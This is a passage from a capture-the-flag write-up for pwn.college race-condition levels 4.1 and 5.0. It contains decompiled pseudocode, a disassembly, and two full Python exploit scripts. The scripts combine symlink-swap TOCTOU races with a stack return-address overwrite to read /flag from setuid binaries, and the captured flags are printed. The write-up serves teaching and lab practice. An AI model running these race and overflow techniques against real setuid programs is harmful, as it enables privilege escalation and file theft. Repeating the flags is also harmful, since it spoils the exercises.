    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  if ( stat_buf.st_size > 256 )
  {
    puts("Error: file is too large!");
    exit(1);
  }
  v3 = open(argv[1], 0);
  read(v3, buf, 0x1000uLL);
  puts("### Goodbye!");
  return 0;
}
```

```c
__uid_t win()
{
  int *v0; // rax
  char *v1; // rax
  __uid_t result; // eax
  int *v3; // rax
  char *v4; // rax

  puts("You win! Here is your flag:");
  flag_fd_5683 = open("/flag", 0);
  if ( flag_fd_5683 >= 0 )
  {
    flag_length_5684 = read(flag_fd_5683, &flag_5682, 0x100uLL);
    if ( flag_length_5684 > 0 )
    {
      write(1, &flag_5682, flag_length_5684);
      return puts("\n");
    }
    else
    {
      v3 = __errno_location();
      v4 = strerror(*v3);
      return printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
    }
  }
  else
  {
    v0 = __errno_location();
    v1 = strerror(*v0);
    printf("\n  ERROR: Failed to open the flag -- %s!\n", v1);
    result = geteuid();
    if ( result )
    {
      puts("  Your effective user id is not 0!");
      return puts("  You must directly run the suid binary in order to have the correct permissions!");
    }
  }
  return result;
}
```

### Analysis

This is identical to level4.0 with one key difference: the `getchar()` pauses are gone, making the race window microseconds wide instead of seconds.

`win()` is never called from `main` — it opens `/flag` directly (hardcoded) and writes the contents to stdout. The goal is to redirect execution there via a stack buffer overflow + return address overwrite.

Checking the address of `win()` in pwndbg:

```text
pwndbg> disassemble win
Dump of assembler code for function win:
   0x00000000004012d6 <+0>:     endbr64
   0x00000000004012da <+4>:     push   rbp
   0x00000000004012db <+5>:     mov    rbp,rsp
   0x00000000004012de <+8>:     lea    rdi,[rip+0xd23]        # 0x402008
   0x00000000004012e5 <+15>:    call   0x401130 <puts@plt>
   0x00000000004012ea <+20>:    mov    esi,0x0
   0x00000000004012ef <+25>:    lea    rdi,[rip+0xd2e]        # 0x402024
   0x00000000004012f6 <+32>:    mov    eax,0x0
   0x00000000004012fb <+37>:    call   0x4011b0 <open@plt>
   0x0000000000401300 <+42>:    mov    DWORD PTR [rip+0x2dba],eax        # 0x4040c0 <flag_fd.5683>
   0x0000000000401306 <+48>:    mov    eax,DWORD PTR [rip+0x2db4]        # 0x4040c0 <flag_fd.5683>
   0x000000000040130c <+54>:    test   eax,eax
   0x000000000040130e <+56>:    jns    0x401359 <win+131>
   0x0000000000401310 <+58>:    call   0x401120 <__errno_location@plt>
   0x0000000000401315 <+63>:    mov    eax,DWORD PTR [rax]
   0x0000000000401317 <+65>:    mov    edi,eax
   0x0000000000401319 <+67>:    call   0x4011d0 <strerror@plt>
   0x000000000040131e <+72>:    mov    rsi,rax
   0x0000000000401321 <+75>:    lea    rdi,[rip+0xd08]        # 0x402030
   0x0000000000401328 <+82>:    mov    eax,0x0
   0x000000000040132d <+87>:    call   0x401160 <printf@plt>
   0x0000000000401332 <+92>:    call   0x401180 <geteuid@plt>
   0x0000000000401337 <+97>:    test   eax,eax
   0x0000000000401339 <+99>:    je     0x4013d0 <win+250>
   0x000000000040133f <+105>:   lea    rdi,[rip+0xd1a]        # 0x402060
   0x0000000000401346 <+112>:   call   0x401130 <puts@plt>
   0x000000000040134b <+117>:   lea    rdi,[rip+0xd36]        # 0x402088
   0x0000000000401352 <+124>:   call   0x401130 <puts@plt>
   0x0000000000401357 <+129>:   jmp    0x4013d0 <win+250>
   0x0000000000401359 <+131>:   mov    eax,DWORD PTR [rip+0x2d61]        # 0x4040c0 <flag_fd.5683>
   0x000000000040135f <+137>:   mov    edx,0x100
   0x0000000000401364 <+142>:   lea    rsi,[rip+0x2d75]        # 0x4040e0 <flag.5682>
   0x000000000040136b <+149>:   mov    edi,eax
   0x000000000040136d <+151>:   call   0x401190 <read@plt>
   0x0000000000401372 <+156>:   mov    DWORD PTR [rip+0x2e68],eax        # 0x4041e0 <flag_length.5684>
   0x0000000000401378 <+162>:   mov    eax,DWORD PTR [rip+0x2e62]        # 0x4041e0 <flag_length.5684>
   0x000000000040137e <+168>:   test   eax,eax
   0x0000000000401380 <+170>:   jg     0x4013a6 <win+208>
   0x0000000000401382 <+172>:   call   0x401120 <__errno_location@plt>
   0x0000000000401387 <+177>:   mov    eax,DWORD PTR [rax]
   0x0000000000401389 <+179>:   mov    edi,eax
   0x000000000040138b <+181>:   call   0x4011d0 <strerror@plt>
   0x0000000000401390 <+186>:   mov    rsi,rax
   0x0000000000401393 <+189>:   lea    rdi,[rip+0xd46]        # 0x4020e0
   0x000000000040139a <+196>:   mov    eax,0x0
   0x000000000040139f <+201>:   call   0x401160 <printf@plt>
   0x00000000004013a4 <+206>:   jmp    0x4013d1 <win+251>
   0x00000000004013a6 <+208>:   mov    eax,DWORD PTR [rip+0x2e34]        # 0x4041e0 <flag_length.5684>
   0x00000000004013ac <+214>:   cdqe
   0x00000000004013ae <+216>:   mov    rdx,rax
   0x00000000004013b1 <+219>:   lea    rsi,[rip+0x2d28]        # 0x4040e0 <flag.5682>
   0x00000000004013b8 <+226>:   mov    edi,0x1
   0x00000000004013bd <+231>:   call   0x401140 <write@plt>
   0x00000000004013c2 <+236>:   lea    rdi,[rip+0xd41]        # 0x40210a
   0x00000000004013c9 <+243>:   call   0x401130 <puts@plt>
   0x00000000004013ce <+248>:   jmp    0x4013d1 <win+251>
   0x00000000004013d0 <+250>:   nop
   0x00000000004013d1 <+251>:   pop    rbp
   0x00000000004013d2 <+252>:   ret
End of assembler dump.
```

### TOCTOU

Without pauses the race window is microseconds wide. We use the same directory maze technique as level2.1 to widen the kernel path resolution time:

```text
Real tree:  top -> a,    a/b/c/d/e/x   = real small file (passes lstat)
Fake tree:  top -> fake, fake/b/c/d/e/x = symlink to bigfile (ROP payload)
```

`lstat("top/b/c/d/e/x")` resolves through `a` and sees a real small file, passing all checks. We then swap `top` to point to `fake` before `open()` runs, so `open("top/b/c/d/e/x")` resolves to `fake/b/c/d/e/x` → symlink → `bigfile`.

### Stack Buffer Overflow + Return Address Overwrite

Same overflow as level4.0. Stack layout:

```text
char buf[256]      →  rbp-190h
struct stat stat_buf  →  rbp-90h
saved rbp          →  rbp
return address     →  rbp+8
```

Offset from `buf` to return address = `0x190 + 8` = **408 bytes**. Payload: 400 bytes padding + 8 bytes to overwrite saved rbp + `win()` address (`0x4012d6`).

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, time, os
import struct

WIN_ADDR = 0x00000000004012d6

# 400 bytes padding + 8 bytes saved rbp + win() address
payload = b"A" * 400 + b"B" * 8 + struct.pack("<Q", WIN_ADDR)

# Setup maze
os.system("rm -rf a fake top bigfile")
os.system("mkdir -p a/b/c/d/e && echo hi > a/b/c/d/e/x")
os.makedirs("fake/b/c/d/e", exist_ok=True)

with open("bigfile", "wb") as f:
    f.write(payload)

os.system(f"rm -f fake/b/c/d/e/x && ln -s {os.path.abspath('bigfile')} fake/b/c/d/e/x")

print(f"[*] Payload size: {len(payload)} bytes")
print("[*] Starting exploit loop...")

attempt = 0
sleeps = [0.00001, 0.00005, 0.0001, 0.0002, 0.0005, 0.001, 0.002, 0.005]
sleep_idx = 0
sleep_val = sleeps[sleep_idx]

while True:
    attempt += 1

    if attempt % 200 == 0:
        sleep_idx = (sleep_idx + 1) % len(sleeps)
        sleep_val = sleeps[sleep_idx]
        print(f"[*] Attempt {attempt}, trying sleep={sleep_val}")

    try:
        os.remove("top")
    except FileNotFoundError:
        pass
    os.symlink("a", "top")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level4.1", "top/b/c/d/e/x"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    time.sleep(sleep_val)

    try:
        os.remove("top")
    except FileNotFoundError:
        pass
    os.symlink("fake", "top")

    out = proc.stdout.read()
    proc.wait()

    if attempt % 200 == 0:
        print(f"    Last output: {out.decode(errors='replace').strip()[-60:]}")

    if b"pwn.college" in out:
        print(f"[+] Got the flag with sleep={sleep_val}!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level4-1:~$ python ~/script.py
[*] Payload size: 416 bytes
[*] Starting exploit loop...
[*] Attempt 200, trying sleep=5e-05
    Last output: /challenge/babyrace_level4.1!
###
Error: file is a symlink!
[*] Attempt 400, trying sleep=0.0001
    Last output: /challenge/babyrace_level4.1!
###
Error: file is a symlink!
[*] Attempt 600, trying sleep=0.0002
    Last output: /challenge/babyrace_level4.1!
###
Error: file is a symlink!
[*] Attempt 800, trying sleep=0.0005
    Last output: # Welcome to /challenge/babyrace_level4.1!
###
### Goodbye!
[*] Attempt 1000, trying sleep=0.001
    Last output: # Welcome to /challenge/babyrace_level4.1!
###
### Goodbye!
[*] Attempt 1200, trying sleep=0.002
    Last output: # Welcome to /challenge/babyrace_level4.1!
###
### Goodbye!
[*] Attempt 1400, trying sleep=0.005
    Last output: # Welcome to /challenge/babyrace_level4.1!
###
### Goodbye!
[+] Got the flag with sleep=0.005!
###
### Welcome to /challenge/babyrace_level4.1!
###
### Goodbye!
You win! Here is your flag:
pwn.college{8mY5J_7CMeMw0isLBN2GRaR5HoX.0FOwQDL4ITM0EzW}
```

&nbsp;

## level5.0

> Exploit a complex race condition to read the flag. This race condition involves multiple steps, which makes it less reliable to exploit!

```text
hacker@race-conditions~level5-0:~$ /challenge/babyrace_level5.0
###
### Welcome to /challenge/babyrace_level5.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be be sent to you.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the directory the file is in is owned by root
and that other users are not able to create files in that directory.
babyrace_level5.0: <stdin>:76: main: Assertion `argc > 1' failed.
Aborted
```

The program performs four checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The directory containing the file must be owned by root (`stat` → `st_uid == 0`).
4. The directory must not be group owned by non-root and must not be world-writable (`st_gid == 0`, `st_mode & 2 == 0`).

### Source code analysis

```c title="/challenge/babyrace_level5.0 :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax
  char *v4; // rax
  int v5; // eax
  size_t v6; // rax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
  unsigned __int64 v10; // [rsp+1B8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows");
  puts("you to open a single file, as specified by the first argument to the program (argv[1]).\n");
  puts("The file opened will be be sent to you.\n");
  puts("This challenge will verify that the file's path does not include \"flag\".");
  puts("This challenge will verify that the file is not a symlink.");
  puts("This challenge will verify that the directory the file is in is owned by root");
  puts("and that other users are not able to create files in that directory.");
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x31u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  puts("Calling lstat (does not follow symlinks) on the path.\n");
  puts("Paused (press enter to continue)");
  getchar();
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  puts("Calling stat (follows symlinks) on the directory.\n");
  puts("Paused (press enter to continue)");
  getchar();
  v3 = strdup(argv[1]);
  v4 = dirname(v3);
  if ( (unsigned int)stat(v4, &stat_buf) == -1 )
  {
    puts("Error: failed to get directory status!");
    exit(1);
  }
  if ( stat_buf.st_uid )
  {
    puts("Error: directory not owned by root!");
    exit(1);
  }
  if ( stat_buf.st_gid )
  {
    puts("Error: directory not group owned by root!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 2) != 0 )
  {
    puts("Error: other users are able to write in this directory!");
    exit(1);
  }
  puts("Paused (press enter to continue)");
  getchar();
  v5 = open(argv[1], 0);
  v6 = read(v5, buf, 0x100uLL);
  write(1, buf, v6);
  puts("### Goodbye!");
  return 0;
}
```

There are now **three pauses** creating two distinct race windows:

```text
Pause 1 → lstat(file)        → checks file is not a symlink
Pause 2 → stat(directory)    → checks dir is root-owned, no world-write
Pause 3 → open(file)         → reads and outputs the file
```

The directory check uses `stat()` which **follows symlinks** — so we can pass a symlink to a root-owned directory and it will follow it and check the target. This is the key: we don't need to own a root-owned directory, we just need to **point at one** when the check runs.

We pass the path `d/x` where `d` is a symlink we control, and swap it between three states across the three pauses:

```text
Pause 1: d -> /home/hacker, x = real file
         lstat("d/x") sees real file -> not a symlink ✓

Pause 2: d -> /etc
         dirname("d/x") = "d" -> stat("d") -> stat("/etc")
         /etc is root-owned, no world-write ✓

Pause 3: d -> /home/hacker, x = symlink to /flag
         open("d/x") = open("/home/hacker/x") = open(/flag) -> reads flag ✓
```

Note that `lstat` only checks the **final component** of the path for being a symlink — intermediate directory symlinks like `d` are followed freely. This is why swapping `d` does not trigger the symlink check.

### Exploit

```python title="~/script.py" showLineNumbers
import subprocess, time, os, warnings
warnings.filterwarnings("ignore")

# Setup
os.system("rm -f /home/hacker/x && echo hi > /home/hacker/x")

print("[*] Starting exploit loop...")
attempt = 0
proc = None

while True:
    attempt += 1

    # Explicitly clean up previous process
    if proc is not None:
        try:
            proc.stdin.close()
        except Exception:
            pass
        try:
            proc.stdout.close()
        except Exception:
            pass
        try:
            proc.kill()
        except Exception:
            pass
        try:
            proc.wait()
        except Exception:
            pass
        proc = None

    # Reset x to real file each attempt
    os.system("rm -f /home/hacker/x && echo hi > /home/hacker/x")

    try:
        os.remove("d")
    except FileNotFoundError:
        pass
    os.symlink("/home/hacker", "d")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level5.0", "d/x"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        close_fds=True
    )

    # Pause 1: lstat sees d/x = real file -> passes symlink check
    time.sleep(0.1)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except Exception:
        continue

    # Swap d -> /etc so stat(dirname("d/x")) = stat(/etc) = root-owned, no world-write
    try:
        os.remove("d")
    except FileNotFoundError:
        pass
    os.symlink("/etc", "d")

    # Pause 2: stat sees /etc -> passes directory ownership check
    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except Exception:
        continue

    # Swap d back to home, swap x to symlink -> open() reads /flag
    try:
        os.remove("d")
    except FileNotFoundError:
        pass
    os.symlink("/home/hacker", "d")
    os.system("rm -f /home/hacker/x && ln -s /flag /home/hacker/x")

    # Pause 3: open(d/x) = open(/home/hacker/x) = open(/flag)
    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
        proc.stdin.close()
    except Exception:
        continue

    out = proc.stdout.read()
    proc.wait()
    proc = None

    if attempt % 10 == 0:
        print(f"[*] Attempt {attempt}...")

    if attempt <= 3:
        print(f"[DBG] {out.decode(errors='replace')[-300:]}")

    if b"pwn.college" in out:
        print("[+] Got the flag!")
        print(out.decode(errors='replace'))
        break
```

```text
hacker@race-conditions~level5-0:~$ python3 ~/script.py
[*] Starting exploit loop...
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level5.0!
###
Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be be sent to you.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the directory the file is in is owned by root
and that other users are not able to create files in that directory.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Calling stat (follows symlinks) on the directory.
Paused (press enter to continue)
Paused (press enter to continue)
pwn.college{gXKlwRMMcYar5h7AewIEIbhmQyx.0VOwQDL4ITM0EzW}
### Goodbye!
```